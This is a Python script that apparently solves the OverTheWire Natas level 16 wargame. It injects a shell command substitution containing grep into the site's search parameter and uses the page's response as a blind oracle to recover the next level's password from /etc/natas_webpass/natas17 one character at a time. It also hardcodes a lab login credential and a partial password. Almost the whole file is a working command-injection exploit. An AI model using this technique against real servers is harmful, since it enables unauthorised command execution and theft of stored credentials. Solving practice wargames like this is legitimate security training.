import aiohttp
import asyncio
import string

VALID_CHARS = string.ascii_letters + string.digits
BASE_URL = "http://natas16.natas.labs.overthewire.org/"
PASSWORD_FILE = "/etc/natas_webpass/natas17"
PASSWORD_LEN = 32
KNOWN_WORD = "breezes"

# Credentials are passed as a tuple in aiohttp
AUTH = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

found_password = "bo7LFNb8vwhHb9s75hokh5TF0OC"
matched_characters = "bhjkoqsvwCEFHJLNOT05789"

'''
    Find first part of password
'''
async def test_char(password, session):
    while True:
        for c in matched_characters:
            payload = f"$(grep  {c + password} {PASSWORD_FILE}){KNOWN_WORD}"
            url = BASE_URL + f"?needle={payload}&submit=Search"
            
            async with session.get(url, auth=aiohttp.BasicAuth(*AUTH)) as response:
                if KNOWN_WORD not in await response.text():
                    password = c + password
                    print(f"Matched characters: {password}")
        
            if len(password) == PASSWORD_LEN:
                return password

async def main():
    async with aiohttp.ClientSession() as session:
        password = await test_char(found_password, session)
        
    print(f"Final password:\n{password}")

# Run the async function
asyncio.run(main())
